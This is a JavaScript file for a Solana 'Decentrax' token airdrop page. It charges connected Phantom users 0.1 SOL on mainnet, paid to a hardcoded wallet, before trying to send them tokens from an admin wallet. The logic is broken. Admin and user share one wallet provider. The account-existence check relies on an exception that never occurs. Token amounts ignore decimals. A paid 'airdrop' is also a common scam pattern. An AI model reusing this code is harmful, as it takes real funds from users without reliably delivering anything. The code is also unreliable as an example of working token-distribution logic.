const AIRDROP_WALLET = "6zkf4DviZZkpWVEh53MrcQV6vGXGpESnNXgAvU6KpBUH";
const TOKEN_ADDRESS = "8tymgjotRoCnYGA3yzyN8ipRXsq8gnxnGBYkmSYJqD82";
const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const SOL_PAYMENT = 0.1;
const TOKEN_AMOUNT = 1000;

let userWalletAddress = null;
let adminWalletAddress = null;
let userProvider = null;
let adminProvider = null;

// Check if admin wallet is connected
function isAdminConnected() {
    return adminWalletAddress === AIRDROP_WALLET;
}

// Show admin panel if correct URL parameter
window.addEventListener('load', () => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('admin') === 'true') {
        document.getElementById('adminSection').style.display = 'block';
    }
});

async function connectAdminWallet() {
    try {
        if (!window.solana || !window.solana.isPhantom) {
            alert('Please install Phantom wallet!');
            return;
        }

        adminProvider = window.solana;
        const response = await adminProvider.connect();
        adminWalletAddress = response.publicKey.toString();
        
        if (adminWalletAddress !== AIRDROP_WALLET) {
            alert('This is not the admin wallet!');
            adminWalletAddress = null;
            adminProvider = null;
            return;
        }

        document.getElementById('adminWalletAddress').textContent = `Admin Connected: ${adminWalletAddress.slice(0, 4)}...${adminWalletAddress.slice(-4)}`;
        document.getElementById('connectAdminWallet').style.display = 'none';
    } catch (err) {
        console.error(err);
        alert('Failed to connect admin wallet!');
    }
}

async function connectUserWallet() {
    try {
        if (!window.solana || !window.solana.isPhantom) {
            alert('Please install Phantom wallet!');
            return;
        }

        userProvider = window.solana;
        const response = await userProvider.connect();
        userWalletAddress = response.publicKey.toString();
        document.getElementById('walletAddress').textContent = `Connected: ${userWalletAddress.slice(0, 4)}...${userWalletAddress.slice(-4)}`;
        document.getElementById('connectWallet').style.display = 'none';
        document.getElementById('claimButton').disabled = false;
    } catch (err) {
        console.error(err);
        alert('Failed to connect wallet!');
    }
}

async function getOrCreateAssociatedTokenAccount(connection, payer, mint, owner) {
    const associatedToken = await splToken.Token.getAssociatedTokenAddress(
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
        TOKEN_PROGRAM_ID,
        new solanaWeb3.PublicKey(mint),
        new solanaWeb3.PublicKey(owner)
    );
    
    try {
        await connection.getAccountInfo(associatedToken);
    } catch (err) {
        const transaction = new solanaWeb3.Transaction().add(
            splToken.Token.createAssociatedTokenAccountInstruction(
                splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                TOKEN_PROGRAM_ID,
                new solanaWeb3.PublicKey(mint),
                associatedToken,
                new solanaWeb3.PublicKey(owner),
                payer
            )
        );
        await userProvider.sendTransaction(transaction, connection);
    }
    
    return associatedToken;
}

async function claimAirdrop() {
    try {
        if (!userProvider || !userWalletAddress) {
            alert('Please connect your wallet first!');
            return;
        }

        if (!isAdminConnected()) {
            alert('Admin wallet not connected. Tokens cannot be distributed automatically.');
            return;
        }

        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        
        // Send SOL payment
        const solTransaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: new solanaWeb3.PublicKey(userWalletAddress),
                toPubkey: new solanaWeb3.PublicKey(AIRDROP_WALLET),
                lamports: solanaWeb3.LAMPORTS_PER_SOL * SOL_PAYMENT
            })
        );

        const { blockhash } = await connection.getRecentBlockhash();
        solTransaction.recentBlockhash = blockhash;
        solTransaction.feePayer = new solanaWeb3.PublicKey(userWalletAddress);

        const signed = await userProvider.signAndSendTransaction(solTransaction);
        console.log('SOL Transaction signature:', signed.signature);
        
        // Wait for transaction confirmation
        await connection.confirmTransaction(signed.signature);
        
        // Create or get user's token account
        const userTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            new solanaWeb3.PublicKey(userWalletAddress),
            TOKEN_ADDRESS,
            userWalletAddress
        );
        
        // Send tokens from admin wallet
        const tokenTransaction = new solanaWeb3.Transaction().add(
            splToken.Token.createTransferInstruction(
                TOKEN_PROGRAM_ID,
                new solanaWeb3.PublicKey(adminWalletAddress),
                userTokenAccount,
                new solanaWeb3.PublicKey(adminWalletAddress),
                [],
                TOKEN_AMOUNT
            )
        );

        tokenTransaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
        tokenTransaction.feePayer = new solanaWeb3.PublicKey(adminWalletAddress);

        const tokenSigned = await adminProvider.signAndSendTransaction(tokenTransaction);
        console.log('Token Transaction signature:', tokenSigned.signature);
        
        alert('Success! You have received your Decentrax tokens!');
    } catch (err) {
        console.error(err);
        alert('Transaction failed! Please try again.');
    }
}

document.getElementById('connectAdminWallet').addEventListener('click', connectAdminWallet);
document.getElementById('connectWallet').addEventListener('click', connectUserWallet);
document.getElementById('claimButton').addEventListener('click', claimAirdrop);
